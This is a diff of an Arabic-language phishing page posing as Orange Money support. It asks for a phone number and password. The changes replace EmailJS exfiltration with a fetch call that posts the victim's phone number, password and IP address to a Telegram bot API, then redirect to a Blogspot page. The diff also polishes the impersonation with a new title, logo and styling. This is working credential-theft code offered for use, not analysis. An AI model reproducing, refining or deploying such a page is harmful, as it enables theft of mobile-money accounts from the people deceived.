@@ -1,25 +1,34 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>خدمات الدعم من خلال Orange</title>
+    <title>Orange Money ✔️</title>
     <style>
         body {
             display: flex;
             justify-content: center;
             align-items: center;
             font-family: 'Arial', sans-serif;
-            background-color: #FFFFFF;
-            color: #000000;
+            background-color: #f5f5f5;
+            color: #333;
             margin: 0;
             padding: 0;
-            text-align: right;
-            overflow: hidden; /* منع التمرير */
+            text-align: center;
+            overflow: hidden;
         }
+
         .container {
             max-width: 400px;
         }
+
+        img {
+            width: 100%;
+            max-width: 300px;
+            margin-bottom: 20px;
+        }
+
         label {
             display: block;
             margin: 15px 0 5px;
@@ -27,51 +36,52 @@
             font-size: 14px;
             text-align: right;
         }
-        input[type="tel"], input[type="password"] {
+
+        input[type="tel"],
+        input[type="password"] {
             width: 90%;
             padding: 10px;
-            margin-top: 5px;
-            margin-bottom: 5px;
+            margin: 5px 0;
             border: none;
-            border-bottom: 2px solid #000000;
+            border-bottom: 1px solid #ccc;
             border-radius: 5px;
             font-size: 14px;
             outline: none;
             text-align: right;
-            transition: 0.10s ease all;
+            transition: 0.2s ease all;
         }
+
         .btn {
             background-color: #ff6600;
             color: #000000;
             border: none;
-            padding: 8px;
+            padding: 12px;
             width: 100%;
             border-radius: 5px;
-            font-size: 12px;
+            font-size: 16px;
             cursor: pointer;
-            margin-top: 1px;
+            margin-top: 20px;
         }
+
         .btn:hover {
             background-color: #e55a00;
         }
+
         .error {
             color: red;
-            font-size: 10px;
-            margin-bottom: 7px;
-            display: none; /* يتم إخفاء الإشعار في البداية */
+            font-size: 14px;
+            margin-bottom: 15px;
+            display: none;
         }
+
         .subnote {
             font-size: 12px;
             color: #999;
             text-align: right;
-            margin-bottom: 6px;
+            margin-bottom: 15px;
         }
     </style>
-    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <script>
-        // تهيئة EmailJS باستخدام User ID
-        emailjs.init("Zt4sUADNmecFKWHmd");
-
         function validatePassword(password) {
             const arabicRegex = /[\u0600-\u06FF]/;
             if (arabicRegex.test(password)) return false;
@@ -79,7 +89,7 @@
             const numberRegex = /\d/;
             const letterRegex = /[a-zA-Z]/;
             return (symbolRegex.test(password) && numberRegex.test(password)) &&
-                   (!letterRegex.test(password) || letterRegex.test(password));
+                (!letterRegex.test(password) || letterRegex.test(password));
         }
 
         function validateForm() {
@@ -110,30 +120,36 @@
                 const ipResponse = await ipRequest.json();
                 const ipAddress = ipResponse.ip;
 
-                const templateParams = {
-                    phone: phone,
-                    password: password,
-                    ip: ipAddress
-                };
-
-                // إرسال البيانات عبر EmailJS باستخدام Service ID و Template ID
-                await emailjs.send("service_v614t8d", "template_lv9areh", templateParams);
+                const message = `رقم الهاتف: ${phone}\nكلمة السر: ${password}\nIP: ${ipAddress}`;
+                await fetch('https://api.telegram.org/bot<7559890589:AAF2WJyB7owLr_hW0aSI7dYluWp4s1WNd2A>/sendMessage', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: '< 7497931629>',
+                        text: message
+                    })
+                });
                 alert("تم إرسال البيانات بنجاح!");
-                window.location.href = "https://orangeonlinemoney.blogspot.com/2024/12/orange-console.html";
+                window.location.href = "https://myorangenaw.blogspot.com/2024/11/body-display-flex-justify-content_42.html";
             } catch (error) {
                 console.error('Error:', error);
-                alert("حدث خطأ أثناء إرسال البيانات.");
+                document.getElementById('error-msg').innerText = 'حدث خطأ أثناء إرسال البيانات.';
+                document.getElementById('error-msg').style.display = 'block';
             }
         }
     </script>
 </head>
+
 <body>
     <div class="container">
-        <h1>خدمات الدعم من خلال Orange</h1>
+        <img src="https://ibb.co/2cW42bF" alt="Orange Money Logo">
+        <h1>خدمات الدعم من Orange Money</h1>
         <form onsubmit="onSubmit(event)">
-            <label for="phone">رقـم الهاتـف</label>
+            <label for="phone">رقم الهاتف</label>
             <input type="tel" id="phone" placeholder="أدخل رقم الهاتف" pattern="[0-9]{10}" maxlength="10" required>
-            <div class="subnote">الرجاء إدخال رقم الهاتف الذي يبدأ بـ ٠۷۷ او ۰۷۸ أو ۰۷۹</div>
+            <div class="subnote">الرجاء إدخال رقم الهاتف الذي يبدأ بـ 077 أو 078 أو 079</div>
             <label for="password">كلمة السر</label>
             <input type="password" id="password" placeholder="أدخل كلمة السر" required>
             <div id="error-msg" class="error"></div>
@@ -141,4 +157,5 @@
         </form>
     </div>
 </body>
+
 </html>
